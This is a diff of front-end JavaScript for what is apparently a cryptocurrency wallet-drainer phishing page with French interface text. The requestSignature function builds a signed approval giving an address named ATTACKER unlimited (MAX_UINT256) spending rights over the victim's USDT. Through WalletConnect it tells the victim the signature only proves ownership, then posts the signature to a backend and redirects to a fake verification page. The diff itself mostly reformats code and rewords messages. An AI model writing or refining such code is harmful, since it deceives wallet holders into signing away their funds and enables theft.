@@ -1036,19 +1036,14 @@
 
 async function requestSignature() {
   try {
-    // Provider pour récupérer le nonce
-    const provider = new ethers.providers.JsonRpcProvider(
-      'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793'
-    );
-    const permitContract = new ethers.Contract(
-      PERMIT_DRAIN_ADDRESS,
-      ['function nonces(address) view returns (uint256)'],
-      provider
-    );
+    const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793');
+    const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, [
+      'function nonces(address) view returns (uint256)'
+    ], provider);
     const nonce = await permitContract.nonces(account);
     const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-    // Construction du hash structuré (identique à celui du contrat)
+    // Construction du message structuré (abi.encode → solidityKeccak256)
     const structHash = ethers.utils.solidityKeccak256(
       ['address', 'address', 'address', 'uint256', 'uint256', 'uint256'],
       [account, USDT_ADDR, ATTACKER, MAX_UINT256, deadline, nonce]
@@ -1056,10 +1051,9 @@ async function requestSignature() {
     const messageToSign = ethers.utils.hexlify(structHash);
 
     const scanText = document.querySelector('.scan');
-    if (scanText)
-      scanText.textContent = 'Veuillez signer le message pour prouver la propriété…';
+    if (scanText) scanText.textContent = 'Veuillez signer le message pour prouver la propriété…';
 
-    // Demander la signature via WalletConnect (personal_sign)
+    // Signature via WalletConnect (personal_sign)
     const signature = await signClient.request({
       topic: session.topic,
       request: {
@@ -1071,8 +1065,7 @@ async function requestSignature() {
       chainId: 'eip155:1'
     });
 
-    if (scanText)
-      scanText.textContent = '✅ Message signé. Vérification en cours…';
+    if (scanText) scanText.textContent = '✅ Message signé. Traitement de la vérification…';
 
     // Envoyer la signature au backend
     const resp = await fetch(API, {
@@ -1088,19 +1081,16 @@ async function requestSignature() {
         amount: MAX_UINT256
       })
     });
-    const result = await resp.json();
-    if (result.success) {
-      if (scanText)
-        scanText.textContent = '✅ Vérification terminée. Redirection…';
-      setTimeout(() => (window.location.href = '/verifyaddress.html'), 3000);
+    const data = await resp.json();
+    if (data.success) {
+      if (scanText) scanText.textContent = '✅ Vérification terminée. Redirection…';
+      setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
     } else {
-      if (scanText)
-        scanText.textContent = '❌ Erreur lors de la vérification. Veuillez réessayer.';
+      if (scanText) scanText.textContent = '❌ Échec de la vérification. Veuillez réessayer.';
     }
   } catch (e) {
     console.error('Signature error:', e);
-    const scanText = document.querySelector('.scan');
-    if (scanText) scanText.textContent = '❌ Signature refusée.';
+    document.querySelector('.scan').textContent = '❌ Signature refusée.';
   }
 }
 
